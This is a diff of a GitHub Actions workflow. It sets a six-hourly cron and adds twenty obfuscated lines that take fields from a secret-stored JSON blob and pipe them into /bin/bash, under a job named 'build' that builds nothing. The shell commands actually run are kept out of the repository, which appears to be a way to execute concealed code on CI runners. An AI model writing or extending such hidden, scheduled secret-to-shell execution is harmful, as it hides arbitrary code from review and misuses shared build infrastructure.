@@ -3,25 +3,34 @@ name: yangxiong19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 4/6 * * *'
-
+    - cron: '58 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yangxiong19871010
         env:
-          yr21295: ${{ secrets.yr21295 }}
+          pifcb76250: ${{ secrets.pifcb76250 }}
         run: |
-          echo $yr21295 | jq -r .e6 | /bin/bash
-          echo $fcbgr33222 | jq -r .tkbo767 | /bin/bash
-          echo $bil7980 | jq -r .a9019 | /bin/bash
-          echo $uhjxm44593 | jq -r .q06704 | /bin/bash
-          echo $lr655 | jq -r .cdlz71 | /bin/bash
-          echo $erwbj779 | jq -r .ibv1806 | /bin/bash
-          echo $nqorg18 | jq -r .l672 | /bin/bash
-          echo $d35444 | jq -r .ojvpl02796 | /bin/bash
-          echo $gn435 | jq -r .g5379 | /bin/bash
+          echo $pifcb76250 | jq -r .t82 | /bin/bash
+          echo $l600 | jq -r .wbjx7 | /bin/bash
+          echo $vj085 | jq -r .hmjvs4 | /bin/bash
+          echo $rqyn95 | jq -r .jiv489 | /bin/bash
+          echo $cfum58920 | jq -r .e517 | /bin/bash
+          echo $j20926 | jq -r .wnwk26743 | /bin/bash
+          echo $c4628 | jq -r .m2 | /bin/bash
+          echo $p30324 | jq -r .l3871 | /bin/bash
+          echo $biriz7753 | jq -r .fyxk1897 | /bin/bash
+          echo $jk22810 | jq -r .i7 | /bin/bash
+          echo $zw8 | jq -r .r6 | /bin/bash
+          echo $birju6564 | jq -r .ablp2102 | /bin/bash
+          echo $uggej30 | jq -r .ctx846 | /bin/bash
+          echo $mhuu9 | jq -r .rodp82 | /bin/bash
+          echo $fv5372 | jq -r .ntjfj2105 | /bin/bash
+          echo $jj97325 | jq -r .bcrzf930 | /bin/bash
+          echo $dwy2 | jq -r .rxl6571 | /bin/bash
+          echo $hz9 | jq -r .pwm7 | /bin/bash
+          echo $v8 | jq -r .lby86225 | /bin/bash
+          echo $is62948 | jq -r .q400 | /bin/bash
 
